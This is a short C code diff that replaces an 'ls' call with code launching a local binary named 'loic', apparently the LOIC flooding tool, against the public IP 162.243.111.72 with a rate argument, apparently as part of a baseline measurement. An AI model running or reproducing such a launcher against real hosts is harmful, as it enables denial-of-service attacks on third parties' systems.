@@ -24,9 +24,13 @@ int set_baseline(char* program, char** arg_list)
 
 int main(int argc, const char *argv[])
 {
-    char* arg_list[] = {"ls", "-l", "/", NULL};
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+    strcat(cwd, "/loic");
 
-    set_baseline("ls", arg_list);
-    wait();
+    char* arg_list[] = {cwd, "162.243.111.72", "-r", "100", NULL};
+
+    printf("Setting baseline\n");
+    set_baseline(cwd, arg_list);
     return 0;
 }
